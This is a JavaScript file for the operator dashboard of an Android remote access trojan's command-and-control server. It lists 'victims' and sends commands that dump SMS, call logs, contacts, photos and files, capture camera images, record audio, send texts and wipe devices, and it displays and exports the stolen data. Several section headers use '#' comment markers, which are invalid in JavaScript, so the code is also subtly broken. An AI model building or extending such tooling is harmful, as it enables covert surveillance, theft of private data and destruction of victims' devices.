// ============================================
// 🔌 SOCKET.IO CONNECTION
// ============================================

const socket = io({
    reconnection: true,
    reconnectionAttempts: 10,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    timeout: 20000
});

let selectedDeviceId = null;
let devices = {};
let commandHistory = [];
let dumpCache = {};

// ============================================
// 📡 SOCKET EVENT HANDLERS
// ============================================

// Connection established
socket.on('connect', () => {
    console.log('✅ Connected to C2 server');
    updateConnectionStatus(true);
});

// Connection lost
socket.on('disconnect', () => {
    console.log('❌ Disconnected from C2 server');
    updateConnectionStatus(false);
});

// Reconnecting
socket.on('reconnecting', (attempt) => {
    console.log(`🔄 Reconnecting... Attempt ${attempt}`);
    document.getElementById('connectionStatus').innerHTML = 
        `<i class="fas fa-circle" style="color:#ffd700;"></i> Reconnecting... (${attempt})`;
});

// Reconnect failed
socket.on('reconnect_failed', () => {
    console.log('❌ Reconnection failed');
    document.getElementById('connectionStatus').innerHTML = 
        `<i class="fas fa-circle" style="color:#ff6b6b;"></i> Connection Lost`;
});

// Device list update
socket.on('devices_update', (data) => {
    devices = data;
    updateDeviceList();
    updateStats();
    updateDeviceCounts();
});

// Command response from device
socket.on('command_response', (data) => {
    console.log(`📥 Command response from ${data.deviceId}:`, data);
    
    // Store in history
    commandHistory.push({
        deviceId: data.deviceId,
        command: data.command,
        response: data.response,
        timestamp: new Date().toISOString()
    });
    
    // Update UI if this is the selected device
    if (data.deviceId === selectedDeviceId) {
        appendOutput(`📥 ${data.response || 'Command executed'}`);
    }
    
    // Update command log in UI
    updateCommandLog(data.deviceId);
});

// Data dump received
socket.on('data_dump_received', (data) => {
    console.log(`📂 Data dump from ${data.deviceId}:`, data.type);
    
    // Cache the dump
    if (!dumpCache[data.deviceId]) {
        dumpCache[data.deviceId] = [];
    }
    dumpCache[data.deviceId].push({
        type: data.type,
        data: data.data,
        timestamp: data.timestamp || new Date().toISOString()
    });
    
    // Update UI if this is the selected device
    if (data.deviceId === selectedDeviceId) {
        loadDumps(data.deviceId);
        appendOutput(`📂 ${data.type} data received (${formatSize(JSON.stringify(data.data).length)})`);
    }
    
    // Update stats
    updateStats();
});

// Device connected notification
socket.on('device_connected', (data) => {
    console.log(`📱 Device connected: ${data.deviceId}`);
    showNotification(`📱 Device ${data.deviceId} connected`, 'success');
});

// Device disconnected notification
socket.on('device_disconnected', (data) => {
    console.log(`📱 Device disconnected: ${data.deviceId}`);
    showNotification(`📱 Device ${data.deviceId} disconnected`, 'warning');
});

// Error from server
socket.on('error', (data) => {
    console.error('Server error:', data);
    showNotification(`❌ ${data.message || 'Server error'}`, 'error');
});

// ============================================
# 📊 UPDATE UI FUNCTIONS
// ============================================

function updateConnectionStatus(connected) {
    const statusEl = document.getElementById('connectionStatus');
    if (connected) {
        statusEl.innerHTML = `<i class="fas fa-circle" style="color:#00ff88;"></i> Connected`;
        statusEl.style.color = '#00ff88';
    } else {
        statusEl.innerHTML = `<i class="fas fa-circle" style="color:#ff6b6b;"></i> Disconnected`;
        statusEl.style.color = '#ff6b6b';
    }
}

function updateDeviceCounts() {
    const total = Object.keys(devices).length;
    const online = Object.values(devices).filter(d => d.connected).length;
    let commands = 0;
    let dumps = 0;
    
    Object.values(devices).forEach(d => {
        commands += (d.commands || []).length;
    });
    
    Object.values(dumpCache).forEach(d => {
        dumps += d.length;
    });
    
    document.getElementById('totalDevices').textContent = total;
    document.getElementById('onlineDevices').textContent = online;
    document.getElementById('totalCommands').textContent = commands;
    document.getElementById('totalDumps').textContent = dumps;
}

function updateStats() {
    updateDeviceCounts();
}

function updateDeviceList() {
    const container = document.getElementById('deviceList');
    const keys = Object.keys(devices);
    
    if (keys.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-mobile-alt" style="font-size:32px;color:#1a2332;"></i>
                <p>No devices connected yet</p>
                <span style="font-size:12px;color:#1a2332;">Waiting for victims...</span>
            </div>
        `;
        return;
    }
    
    container.innerHTML = keys.map(id => {
        const d = devices[id];
        const status = d.connected ? 'online' : 'offline';
        const isActive = selectedDeviceId === id ? 'active' : '';
        const lastSeen = d.lastSeen ? new Date(d.lastSeen).toLocaleString() : 'Never';
        const model = d.info?.model || 'Unknown Device';
        const brand = d.info?.brand || '';
        const android = d.info?.android || '';
        
        return `
            <div class="device-item ${isActive}" onclick="selectDevice('${id}')">
                <div class="device-info">
                    <div class="device-name">
                        <i class="fas ${d.connected ? 'fa-wifi' : 'fa-wifi-slash'}" 
                           style="color: ${d.connected ? '#00ff88' : '#ff6b6b'};"></i>
                        <strong>${model}</strong>
                    </div>
                    <div class="device-details">
                        <span>${brand} ${android}</span>
                        <span class="device-id">${id.substring(0, 12)}...</span>
                    </div>
                    <div class="device-lastseen">Last seen: ${lastSeen}</div>
                </div>
                <span class="badge ${status}">${status.toUpperCase()}</span>
            </div>
        `;
    }).join('');
}

// ============================================
# 🎯 SELECT DEVICE
// ============================================

function selectDevice(id) {
    selectedDeviceId = id;
    updateDeviceList();
    updateCommandLog(id);
    
    const device = devices[id];
    if (!device) {
        document.getElementById('selectedDevice').innerHTML = 
            '<p class="empty">Device not found</p>';
        document.getElementById('commandButtons').style.display = 'none';
        return;
    }
    
    // Show device info
    const info = device.info || {};
    document.getElementById('selectedDevice').innerHTML = `
        <div class="device-selected">
            <div class="device-header">
                <div>
                    <strong>${info.model || 'Unknown Device'}</strong>
                    <span class="device-brand">${info.brand || ''}</span>
                    <span class="device-android">${info.android || ''}</span>
                </div>
                <div class="device-status-indicator ${device.connected ? 'online' : 'offline'}">
                    ● ${device.connected ? 'Online' : 'Offline'}
                </div>
            </div>
            <div class="device-meta">
                <span>📱 ${info.deviceId || id}</span>
                <span>📶 ${info.network || 'Unknown'}</span>
                <span>🔋 ${info.battery || 'Unknown'}</span>
                <span>💾 ${info.storage || 'Unknown'}</span>
            </div>
        </div>
    `;
    
    document.getElementById('commandButtons').style.display = 'block';
    document.getElementById('commandOutput').innerHTML = 'Ready for commands...';
    
    // Load dumps for this device
    loadDumps(id);
    
    // Scroll to command section
    document.querySelector('.command-panel').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

// ============================================
# 📤 SEND COMMANDS
// ============================================

// Command button click handler
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.cmd-btn').forEach(btn => {
        btn.addEventListener('click', function(e) {
            if (!selectedDeviceId) {
                showNotification('⚠️ Select a device first', 'warning');
                return;
            }
            
            const action = this.dataset.action;
            if (!action) return;
            
            // Confirm dangerous commands
            if (action === 'kill' || action === 'wipe') {
                if (!confirm(`⚠️ This will ${action === 'kill' ? 'remove the RAT from' : 'wipe all data on'} the device. Continue?`)) {
                    return;
                }
            }
            
            // Get any additional parameters
            let params = {};
            if (action === 'send_sms') {
                const number = prompt('Enter phone number:');
                if (!number) return;
                const message = prompt('Enter message:');
                if (!message) return;
                params = { number, message };
            }
            
            sendCommand(selectedDeviceId, action, params);
        });
    });
});

async function sendCommand(deviceId, action, params = {}) {
    try {
        // Show sending status
        appendOutput(`⏳ Sending "${action}" to ${deviceId}...`);
        
        const response = await fetch('/api/command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                deviceId: deviceId,
                action: action,
                params: params
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            appendOutput(`✅ Command "${action}" sent successfully`);
            if (result.command) {
                // Store in device's command history
                if (devices[deviceId]) {
                    if (!devices[deviceId].commands) {
                        devices[deviceId].commands = [];
                    }
                    devices[deviceId].commands.push(result.command);
                }
                updateCommandLog(deviceId);
            }
        } else {
            appendOutput(`❌ Error: ${result.error || 'Unknown error'}`);
        }
    } catch (error) {
        appendOutput(`❌ Connection error: ${error.message}`);
        console.error('Send command error:', error);
    }
}

// ============================================
# 📋 COMMAND OUTPUT
// ============================================

function appendOutput(text) {
    const el = document.getElementById('commandOutput');
    if (!el) return;
    
    // Remove "Ready for commands..." placeholder if present
    if (el.innerHTML === 'Ready for commands...') {
        el.innerHTML = '';
    }
    
    const line = document.createElement('div');
    line.className = 'output-line';
    line.textContent = `[${getTimestamp()}] ${text}`;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
}

function getTimestamp() {
    const now = new Date();
    return now.toTimeString().split(' ')[0];
}

function formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
}

// ============================================
# 📊 COMMAND HISTORY
// ============================================

function updateCommandLog(deviceId) {
    const device = devices[deviceId];
    if (!device) return;
    
    const commands = device.commands || [];
    const container = document.getElementById('commandHistory');
    if (!container) return;
    
    if (commands.length === 0) {
        container.innerHTML = '<p class="empty">No commands sent to this device</p>';
        return;
    }
    
    container.innerHTML = commands.slice().reverse().slice(0, 20).map(c => `
        <div class="history-item">
            <span class="cmd-icon">${getCommandIcon(c.action)}</span>
            <span class="cmd-name">${c.action}</span>
            <span class="cmd-status ${c.status}">${c.status}</span>
            <span class="cmd-time">${new Date(c.issued).toLocaleString()}</span>
        </div>
    `).join('');
}

function getCommandIcon(action) {
    const icons = {
        'dump_sms': '📱',
        'dump_calllog': '📞',
        'dump_contacts': '👤',
        'dump_gallery': '🖼️',
        'dump_files': '📂',
        'capture_photo': '📷',
        'start_audio': '🎤',
        'stop_audio': '⏹️',
        'toggle_wifi_on': '📶',
        'toggle_wifi_off': '📶',
        'flash_on': '💡',
        'flash_off': '💡',
        'kill': '💀',
        'wipe': '🗑️',
        'send_sms': '✉️'
    };
    return icons[action] || '⚡';
}

// ============================================
# 📂 DATA DUMPS
// ============================================

function loadDumps(deviceId) {
    const container = document.getElementById('dumpContent');
    if (!container) return;
    
    // Check cache first
    if (dumpCache[deviceId] && dumpCache[deviceId].length > 0) {
        displayDumps(container, dumpCache[deviceId]);
        return;
    }
    
    // Fetch from server
    fetch(`/api/dumps/${deviceId}`)
        .then(res => res.json())
        .then(dumps => {
            dumpCache[deviceId] = dumps;
            displayDumps(container, dumps);
            updateStats();
        })
        .catch(err => {
            console.error('Error loading dumps:', err);
            container.innerHTML = '<p class="empty">Error loading dumps</p>';
        });
}

function displayDumps(container, dumps) {
    if (!dumps || dumps.length === 0) {
        container.innerHTML = '<p class="empty">No data dumps for this device</p>';
        return;
    }
    
    container.innerHTML = dumps.slice().reverse().slice(0, 20).map(d => {
        const formattedData = formatDumpData(d.data);
        const typeIcon = getDumpTypeIcon(d.type);
        const typeLabel = getDumpTypeLabel(d.type);
        
        return `
            <div class="dump-entry">
                <div class="dump-meta">
                    <span class="dump-type">${typeIcon} ${typeLabel}</span>
                    <span class="dump-timestamp">${new Date(d.timestamp).toLocaleString()}</span>
                    <span class="dump-size">${formatSize(JSON.stringify(d.data).length)}</span>
                </div>
                <div class="dump-data">
                    <pre>${formattedData}</pre>
                </div>
                <div class="dump-actions">
                    <button onclick="copyDump('${encodeURIComponent(JSON.stringify(d.data))}')" class="dump-btn">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                    <button onclick="downloadDump('${encodeURIComponent(JSON.stringify(d.data))}', '${d.type}')" class="dump-btn">
                        <i class="fas fa-download"></i> Download
                    </button>
                </div>
            </div>
        `;
    }).join('');
}

function formatDumpData(data) {
    if (data === null || data === undefined) return 'null';
    if (typeof data === 'string') {
        // Check if it's JSON
        try {
            const parsed = JSON.parse(data);
            return JSON.stringify(parsed, null, 2);
        } catch (e) {
            // Not JSON, truncate if too long
            if (data.length > 1000) {
                return data.substring(0, 1000) + '\n... (truncated)';
            }
            return data;
        }
    }
    if (typeof data === 'object') {
        return JSON.stringify(data, null, 2);
    }
    return String(data);
}

function getDumpTypeIcon(type) {
    const icons = {
        'sms': '📱',
        'calllog': '📞',
        'contacts': '👤',
        'gallery': '🖼️',
        'files': '📂',
        'photo': '📷',
        'audio': '🎤',
        'location': '📍',
        'wifi': '📶',
        'bluetooth': '🔵'
    };
    return icons[type] || '📄';
}

function getDumpTypeLabel(type) {
    const labels = {
        'sms': 'SMS Messages',
        'calllog': 'Call Log',
        'contacts': 'Contacts',
        'gallery': 'Gallery',
        'files': 'Files',
        'photo': 'Photo',
        'audio': 'Audio Recording',
        'location': 'Location',
        'wifi': 'WiFi Networks',
        'bluetooth': 'Bluetooth Devices'
    };
    return labels[type] || type.toUpperCase();
}

// ============================================
# 🛠️ DUMP UTILITIES
// ============================================

function copyDump(encodedData) {
    try {
        const data = JSON.parse(decodeURIComponent(encodedData));
        const text = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data);
        navigator.clipboard.writeText(text).then(() => {
            showNotification('✅ Copied to clipboard', 'success');
        }).catch(() => {
            // Fallback
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showNotification('✅ Copied to clipboard', 'success');
        });
    } catch (e) {
        showNotification('❌ Failed to copy', 'error');
    }
}

function downloadDump(encodedData, type) {
    try {
        const data = JSON.parse(decodeURIComponent(encodedData));
        const text = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data);
        const blob = new Blob([text], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `dump_${type}_${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showNotification('✅ Download started', 'success');
    } catch (e) {
        showNotification('❌ Download failed', 'error');
    }
}

function clearDumps() {
    if (!selectedDeviceId) {
        showNotification('⚠️ Select a device first', 'warning');
        return;
    }
    
    if (!confirm('Clear all dumps for this device?')) return;
    
    dumpCache[selectedDeviceId] = [];
    document.getElementById('dumpContent').innerHTML = 
        '<p class="empty">No data dumps for this device</p>';
    updateStats();
    showNotification('✅ Dumps cleared', 'success');
}

function exportAllDumps() {
    if (!selectedDeviceId) {
        showNotification('⚠️ Select a device first', 'warning');
        return;
    }
    
    const dumps = dumpCache[selectedDeviceId] || [];
    if (dumps.length === 0) {
        showNotification('⚠️ No dumps to export', 'warning');
        return;
    }
    
    const text = JSON.stringify(dumps, null, 2);
    const blob = new Blob([text], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `all_dumps_${selectedDeviceId}_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showNotification('✅ Export completed', 'success');
}

// ============================================
# 🔔 NOTIFICATIONS
// ============================================

function showNotification(message, type = 'info') {
    // Remove existing notifications
    const existing = document.querySelector('.notification-toast');
    if (existing) existing.remove();
    
    const colors = {
        'success': '#00ff88',
        'error': '#ff6b6b',
        'warning': '#ffd700',
        'info': '#4ecdc4'
    };
    
    const toast = document.createElement('div');
    toast.className = 'notification-toast';
    toast.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: #111b2b;
        color: ${colors[type] || '#e0e0e0'};
        padding: 12px 20px;
        border-radius: 8px;
        border-left: 4px solid ${colors[type] || '#4ecdc4'};
        border: 1px solid ${colors[type] || '#4ecdc4'}33;
        box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        z-index: 9999;
        animation: slideIn 0.3s ease;
        max-width: 400px;
        font-size: 14px;
    `;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => toast.remove(), 300);
    }, 4000);
}

// Add animation styles
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);

// ============================================
# 🔄 REFRESH FUNCTIONS
// ============================================

function refreshDevices() {
    fetch('/api/devices')
        .then(res => res.json())
        .then(data => {
            devices = data;
            updateDeviceList();
            updateStats();
            showNotification('✅ Devices refreshed', 'success');
        })
        .catch(err => {
            console.error('Refresh failed:', err);
            showNotification('❌ Refresh failed', 'error');
        });
}

function refreshDumps() {
    if (!selectedDeviceId) {
        showNotification('⚠️ Select a device first', 'warning');
        return;
    }
    loadDumps(selectedDeviceId);
    showNotification('✅ Dumps refreshed', 'success');
}

// ============================================
# 🚪 LOGOUT
// ============================================

function logout() {
    if (confirm('Are you sure you want to logout?')) {
        window.location.href = '/';
    }
}

// ============================================
# ⌨️ KEYBOARD SHORTCUTS
// ============================================

document.addEventListener('keydown', function(e) {
    // Ctrl+R = Refresh
    if (e.ctrlKey && e.key === 'r') {
        e.preventDefault();
        refreshDevices();
    }
    // Ctrl+D = Refresh dumps
    if (e.ctrlKey && e.key === 'd') {
        e.preventDefault();
        refreshDumps();
    }
    // Escape = Clear selection
    if (e.key === 'Escape') {
        selectedDeviceId = null;
        document.getElementById('selectedDevice').innerHTML = 
            '<p class="empty">Select a device first</p>';
        document.getElementById('commandButtons').style.display = 'none';
        updateDeviceList();
    }
    // Ctrl+1-9 = Quick command shortcuts
    if (e.ctrlKey && e.key >= '1' && e.key <= '9') {
        e.preventDefault();
        const commands = [
            'dump_sms', 'dump_calllog', 'dump_contacts',
            'dump_gallery', 'capture_photo', 'start_audio',
            'toggle_wifi_on', 'flash_on', 'kill'
        ];
        const idx = parseInt(e.key) - 1;
        if (selectedDeviceId && commands[idx]) {
            sendCommand(selectedDeviceId, commands[idx]);
        }
    }
});

// ============================================
# 📊 DEVICE DETAILS VIEWER
// ============================================

function viewDeviceDetails(deviceId) {
    const device = devices[deviceId];
    if (!device) return;
    
    const info = device.info || {};
    const details = `
        📱 Device Details
        ━━━━━━━━━━━━━━━━━
        Model: ${info.model || 'Unknown'}
        Brand: ${info.brand || 'Unknown'}
        Android: ${info.android || 'Unknown'}
        SDK: ${info.sdk || 'Unknown'}
        Device ID: ${deviceId}
        Status: ${device.connected ? '🟢 Online' : '🔴 Offline'}
        Last Seen: ${device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'}
        Commands: ${(device.commands || []).length}
    `;
    alert(details);
}

// ============================================
# 📈 AUTO-REFRESH
// ============================================

let autoRefreshInterval = null;

function startAutoRefresh(interval = 30000) {
    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
    }
    autoRefreshInterval = setInterval(() => {
        refreshDevices();
    }, interval);
    console.log(`🔄 Auto-refresh started (${interval/1000}s)`);
}

function stopAutoRefresh() {
    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
        autoRefreshInterval = null;
        console.log('🔄 Auto-refresh stopped');
    }
}

// Start auto-refresh by default
startAutoRefresh(30000);

// ============================================
# 📊 CONSOLE HELP
// ============================================

console.log('📊 C2 Dashboard loaded!');
console.log('Available functions:');
console.log('  refreshDevices()    - Refresh device list');
console.log('  refreshDumps()      - Refresh dumps for selected device');
console.log('  logout()           - Logout');
console.log('  startAutoRefresh() - Start auto-refresh');
console.log('  stopAutoRefresh()  - Stop auto-refresh');
console.log('  viewDeviceDetails(id) - View device details');
console.log('  sendCommand(id, action, params) - Send command');
console.log('  showNotification(msg, type) - Show notification');
console.log('\nKeyboard shortcuts:');
console.log('  Ctrl+R  - Refresh devices');
console.log('  Ctrl+D  - Refresh dumps');
console.log('  Escape  - Clear selection');
console.log('  Ctrl+1-9 - Quick commands');

// ============================================
# 🔄 EXPOSE FUNCTIONS GLOBALLY
// ============================================

window.selectDevice = selectDevice;
window.sendCommand = sendCommand;
window.refreshDevices = refreshDevices;
window.refreshDumps = refreshDumps;
window.clearDumps = clearDumps;
window.exportAllDumps = exportAllDumps;
window.copyDump = copyDump;
window.downloadDump = downloadDump;
window.logout = logout;
window.viewDeviceDetails = viewDeviceDetails;
window.startAutoRefresh = startAutoRefresh;
window.stopAutoRefresh = stopAutoRefresh;
window.showNotification = showNotification;

console.log('✅ All functions loaded successfully!');